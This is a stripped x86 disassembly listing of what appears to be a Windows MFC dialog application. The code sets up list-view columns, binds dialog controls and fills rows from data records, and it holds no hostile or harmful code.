lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x1cc ] 0x4
call sub_442148
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x1cc ] 0x3
call sub_442148
lea ecx [ esp + 0x9c ]
mov [ esp + 0x1cc ] 0x2
call sub_421723
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1cc ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1cc ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x1c4 ]
mov [ fs : 0x0 ] ecx
add esp 0x1d0
retn
sub_412360
push 0xffffffff
push sub_45ffff
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x85
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x1c ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x1c ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x14c ]
mov [ esp + 0x1c ] 0x4
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x188 ]
mov [ esp + 0x1c ] 0x5
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x1c4 ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebx [ esi + 0x1c8 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x1cc ]
mov [ ebp ] eax
mov ecx [ rw-data ]
mov [ esi + 0x1d0 ] ecx
push 0x0
lea ecx [ esi + 0x1d4 ]
mov [ esp + 0x20 ] 0xa
call sub_413100
push rw-data
mov ecx edi
mov [ esp + 0x20 ] 0xb
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1d0 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4124e0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3f0
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3e9
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3ed
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3e8
push edi
call sub_449556
lea ecx [ esi + 0x14c ]
push ecx
push 0x3ef
push edi
call sub_449556
lea edx [ esi + 0x188 ]
push edx
push 0x3ee
push edi
call sub_449556
lea eax [ esi + 0x1c4 ]
push eax
push 0x3f0
push edi
call sub_449495
lea ecx [ esi + 0x1c8 ]
push ecx
push 0x3ea
push edi
call sub_4493f1
lea edx [ esi + 0x1cc ]
push edx
push 0x3ec
push edi
call sub_4493f1
add esi 0x1d0
push esi
push 0x3eb
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_4125b0
push 0xffffffff
push sub_460041
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x120
push ebp
push esi
push edi
mov esi ecx
call sub_43e113
push 0x0
lea ecx [ esp + 0x14 ]
call sub_40b290
mov eax [ rw-data ]
mov [ esp + 0x134 ] 0x0
mov [ esp + 0xc ] eax
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x138 ] 0x1
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xd8 ]
mov edi [ SendMessageA@IAT ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x10 ]
call sub_421900
push 0xffffffff
push 0xffffffff
lea ebp [ esi + 0x98 ]
push 0x0
push rw-data
push 0x0
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx ebp
call sub_43c126
mov eax [ esi + 0xb4 ]
push 0x3c
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0xb4 ]
push 0x78
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0xb4 ]
push 0x78
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0xb4 ]
push 0xa0
push 0x3
push 0x101e
push eax
call edi
mov ecx [ esi + 0xb4 ]
push 0x21
push 0x0
push 0x1036
push ecx
call edi
push 0x0
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x188 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
mov ecx esi
call sub_4127f0
lea ecx [ esp + 0xc ]
mov [ esp + 0x134 ] 0x0
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x134 ] 0x4
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0x3
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x134 ] 0x2
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x12c ]
pop edi
pop esi
mov eax 0x1
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x12c
retn
mov edx [ esp + 0x124 ]
mov eax [ esi + 0x78 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
sub_4127f0
push 0xffffffff
push sub_460058
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
mov ebx [ SendMessageA@IAT ]
push esi
push edi
mov esi ecx
xor edi edi
mov eax [ esi + 0xb4 ]
push edi
push edi
push 0x1009
push eax
call ebx
mov ecx [ esi + 0xb4 ]
push edi
push edi
push 0xb
push ecx
call ebx
push 0x1
mov ecx esi
call sub_440b18
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
lea eax [ esp + 0x10 ]
push rw-data
push eax
mov [ esp + 0x24 ] edi
call sub_43b5cc
mov eax [ esp + 0x18 ]
mov edx [ esi + 0x1d4 ]
add esp 0x8
lea ebp [ esi + 0x1d4 ]
mov ecx ebp
push edi
push eax
push 0xffffffff
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x29c ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ ebp ]
mov ecx ebp
call [ eax + 0x10 ]
mov ecx [ esi + 0xb4 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebx
push 0x0
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x1
lea ecx [ esi + 0x110 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x188 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
lea ebx [ esi + 0x98 ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x2e4 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
mov ecx ebx
call sub_43c179
mov eax [ esi + 0x2e8 ]
mov ecx ebx
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x2ec ]
mov ecx ebx
push eax
push 0x2
push edi
call sub_43c1c5
mov eax [ esi + 0x2f0 ]
mov ecx ebx
push eax
push 0x3
push edi
call sub_43c1c5
mov edx [ ebp ]
push 0x1
push 0x1
mov ecx ebp
inc edi
call [ edx + 0x14 ]
mov eax [ esi + 0x29c ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
sub_412980
push esi
mov esi ecx
push rw-data
lea ecx [ esi + 0x1d0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1c8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1c4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1cc ]
call sub_4422d1
push 0x1
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x110 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x188 ]
call sub_441841
push 0x0
lea ecx [ esi + 0x14c ]
call sub_441841
push 0x0
mov ecx esi
call sub_440b18
pop esi
retn
sub_412a10
push 0xffffffff
push sub_460078
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x1d0 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi + 0x1c8 ]
lea ebx [ esi + 0x1c8 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x1c4 ]
lea ebp [ esi + 0x1c4 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
mov ecx [ ebx ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
mov [ esp + 0x28 ] 0x0
call sub_43b5cc
mov ecx [ esp + 0x1c ]
mov eax [ esi + 0x1d4 ]
add esp 0xc
lea edi [ esi + 0x1d4 ]
push 0x0
push ecx
push 0xffffffff
mov ecx edi
call [ eax + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x270 ]
test eax eax
je r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x20 ]
lea eax [ esi + 0x1d0 ]
lea ecx [ esi + 0x2e8 ]
push eax
call sub_442281
push ebx
lea ecx [ esi + 0x2e4 ]
call sub_442281
push ebp
lea ecx [ esi + 0x2ec ]
call sub_442281
lea ecx [ esi + 0x1cc ]
push ecx
lea ecx [ esi + 0x2f0 ]
call sub_442281
mov edx [ edi ]
mov ecx edi
call [ edx + 0x28 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_4127f0
push 0x0
push 0x0
push rw-data
call sub_4496b7
push rw-data
mov ecx ebx
call sub_4422d1
push 0x0
mov ecx esi
call sub_440b18
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_412c00
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4600a0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
push 0x0
mov eax [ esi + 0xb4 ]
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x98 ]
mov [ esp + 0x24 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x1d4 ]
lea edi [ esi + 0x1d4 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x2c ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_4127f0
push rw-data
lea ecx [ esi + 0x1d0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1c8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1c4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1cc ]
call sub_4422d1
push 0x0
mov ecx esi
call sub_440b18
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_412d60
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4600c0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0xb4 ]
push 0x0
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x1d0 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov eax [ esi + 0x1c8 ]
lea ebx [ esi + 0x1c8 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov eax [ esi + 0x1c4 ]
lea ebp [ esi + 0x1c4 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push 0x0
lea edx [ esp + 0x18 ]
push edi
push edx
lea ecx [ esi + 0x98 ]
mov [ esp + 0x2c ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0x2c ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] 0x0
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ esi + 0x1d4 ]
lea edi [ esi + 0x1d4 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x24 ]
lea eax [ esi + 0x1d0 ]
lea ecx [ esi + 0x2e8 ]
push eax
call sub_442281
push ebx
lea ecx [ esi + 0x2e4 ]
call sub_442281
push ebp
lea ecx [ esi + 0x2ec ]
call sub_442281
lea eax [ esi + 0x1cc ]
lea ecx [ esi + 0x2f0 ]
push eax
call sub_442281
mov edx [ edi ]
mov ecx edi
call [ edx + 0x28 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_4127f0
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x20 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_412f70
push 0xffffffff
push sub_4600e0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ rw-data ]
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] eax
push 0x1
mov [ esp + 0x1c ] 0x0
call sub_440b18
mov ecx [ esi + 0xb4 ]
push 0x0
push 0x0
push 0x1042
push ecx
call [ SendMessageA@IAT ]
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x98 ]
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ esi + 0x1d4 ]
lea edi [ esi + 0x1d4 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esi + 0x2e8 ]
push ecx
lea ecx [ esi + 0x1d0 ]
call sub_442281
lea edx [ esi + 0x2e4 ]
lea ecx [ esi + 0x1c8 ]
push edx
call sub_442281
lea eax [ esi + 0x2ec ]
lea ecx [ esi + 0x1c4 ]
push eax
call sub_442281
lea ecx [ esi + 0x2f0 ]
push ecx
lea ecx [ esi + 0x1cc ]
call sub_442281
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
push 0x0
mov ecx esi
call sub_440b18
push 0x0
lea ecx [ esi + 0xd4 ]
call sub_441841
push 0x1
lea ecx [ esi + 0x110 ]
call sub_441841
push 0x1
lea ecx [ esi + 0x188 ]
call sub_441841
push 0x1
lea ecx [ esi + 0x14c ]
call sub_441841
mov eax [ esp + 0x24 ]
mov [ eax ] 0x0
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
sub_413100
push 0xffffffff
push sub_460130
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x14 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebp [ esi + 0x118 ]
mov [ ebp ] edx
mov eax [ rw-data ]
lea ebx [ esi + 0x11c ]
mov [ ebx ] eax
push rw-data
mov [ esp + 0x20 ] 0x4
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x14 ] 0x4
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_413220
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0xc
lea eax [ esi + 0x110 ]
push 0xff
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x118 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
add esi 0x11c
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_4132a0
push 0xffffffff
push sub_46016f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x89
mov [ esp + 0x10 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x9c ]
mov [ edi ] ecx
push 0x0
lea ecx [ esi + 0xa0 ]
mov [ esp + 0x18 ] 0x2
call sub_4146d0
push rw-data
mov ecx edi
mov [ esp + 0x18 ] 0x3
mov [ esi ] r--data
mov [ esi + 0x98 ] 0xffffffff
call sub_4422d1
mov ecx [ esp + 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_413360
push 0xffffffff
push sub_4601c0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x124 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4133f0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3e9
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x412
push edi
call sub_449514
add esi 0x9c
push esi
push 0x413
push edi
call sub_449495
pop edi
pop esi
retn 0x4
sub_413440
push ecx
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
lea edi [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x5
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x6
mov ecx edi
call sub_43c126
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x3c
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x64
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x64
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x64
push 0x3
push 0x101e
push eax
call edi
push 0x64
push 0x4
mov ecx [ esi + 0x78 ]
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x64
push 0x5
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x64
push 0x6
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push ecx
call edi
push ecx
mov ecx esp
mov [ esp + 0xc ] esp
push rw-data
call sub_4421b6
mov ecx esi
call sub_413580
pop edi
mov eax 0x1
pop esi
pop ecx
retn
sub_413580
push 0xffffffff
push sub_4601e0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov esi ecx
mov eax [ esi + 0x78 ]
mov ebx [ SendMessageA@IAT ]
xor edi edi
push edi
push edi
push 0x1009
push eax
mov [ esp + 0x40 ] edi
call ebx
mov ecx [ esi + 0x78 ]
push edi
push edi
push 0xb
push ecx
call ebx
push 0x1
mov ecx esi
call sub_440b18
mov eax [ esp + 0x38 ]
mov edx [ esi + 0xa0 ]
lea ecx [ esi + 0xa0 ]
push edi
push eax
push 0xffffffff
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ esp + 0xc ] ecx
mov eax [ esi + 0x168 ]
mov [ esp + 0x30 ] 0x1
cmp eax edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ esi + 0xa0 ]
lea ecx [ esi + 0xa0 ]
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebx
lea ecx [ esp + 0xc ]
mov [ esp + 0x30 ] 0x0
call sub_442148
push ebp
lea ebp [ esi + 0x5c ]
lea ecx [ esp + 0x38 ]
mov [ esp + 0x30 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x28 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x4
mov eax [ esi + 0x1b0 ]
lea edx [ esp + 0x18 ]
push 0xa
push edx
push eax
call sub_42d656
add esp 0xc
lea ecx [ esp + 0x18 ]
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push edi
push 0x1
mov ecx ebp
call sub_43c179
mov eax [ esi + 0x1b4 ]
mov ecx ebp
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x1b8 ]
mov ecx ebp
push eax
push 0x2
push edi
call sub_43c1c5
mov eax [ esi + 0x1bc ]
mov ecx ebp
push eax
push 0x3
push edi
call sub_43c1c5
mov eax [ esi + 0x1c0 ]
mov ecx ebp
push eax
push 0x4
push edi
call sub_43c1c5
mov eax [ esi + 0x1c4 ]
mov ecx ebp
push eax
push 0x5
push edi
call sub_43c1c5
lea ebx [ esi + 0x1c8 ]
push 0x0
mov ecx ebx
call sub_43b6c3
mov edx [ eax + 0xc ]
push 0x0
mov ecx ebx
mov [ esp + 0x18 ] edx
call sub_43b6c3
mov ebx [ eax + 0x10 ]
push 0x0
lea ecx [ esi + 0x1c8 ]
inc ebx
call sub_43b6c3
mov eax [ eax + 0x14 ]
mov ecx [ esp + 0x14 ]
add eax 0x76c
push ecx
push ebx
push eax
lea edx [ esp + 0x1c ]
push rw-data
push edx
call sub_43b5cc
mov eax [ esp + 0x24 ]
add esp 0x14
mov ecx ebp
push eax
push 0x6
push edi
call sub_43c1c5
mov edx [ esi + 0xa0 ]
lea ecx [ esi + 0xa0 ]
inc edi
push 0x1
push 0x1
call [ edx + 0x14 ]
mov eax [ esi + 0x168 ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
pop ebp
sub_413780
push 0xffffffff
push sub_460253
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x7c
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ esp + 0x14 ]
call sub_4144c0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x8c ] 0x0
call sub_43de8a
cmp eax 0x1
jne r-xdata
lea ecx [ esp + 0x80 ]
mov [ esp + 0x8c ] 0xb
call sub_442148
lea ecx [ esp + 0x7c ]
mov [ esp + 0x8c ] 0xa
call sub_442148
lea ecx [ esp + 0x78 ]
mov [ esp + 0x8c ] 0x9
call sub_442148
lea ecx [ esp + 0x70 ]
mov [ esp + 0x8c ] 0x8
call sub_442148
mov [ esp + 0x8c ] 0x7
mov eax [ edi + 0xa0 ]
lea esi [ edi + 0xa0 ]
push 0x0
push 0x0
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx + 0x20 ]
lea eax [ esp + 0x7c ]
lea ecx [ edi + 0x1b4 ]
push eax
call sub_442281
lea ecx [ esp + 0x78 ]
push ecx
lea ecx [ edi + 0x1c4 ]
call sub_442281
mov edx [ esp + 0x74 ]
lea eax [ esp + 0x6c ]
push eax
lea ecx [ edi + 0x1bc ]
mov [ edi + 0x1c8 ] edx
call sub_442281
lea ecx [ esp + 0x80 ]
push ecx
lea ecx [ edi + 0x1c0 ]
call sub_442281
lea edx [ esp + 0x70 ]
lea ecx [ edi + 0x1b8 ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
push rw-data
lea ecx [ esp + 0xc ]
call sub_4421b6
push ecx
lea eax [ esp + 0xc ]
mov ecx esp
mov [ esp + 0x10 ] esp
push eax
mov [ esp + 0x94 ] 0x6
call sub_441ebd
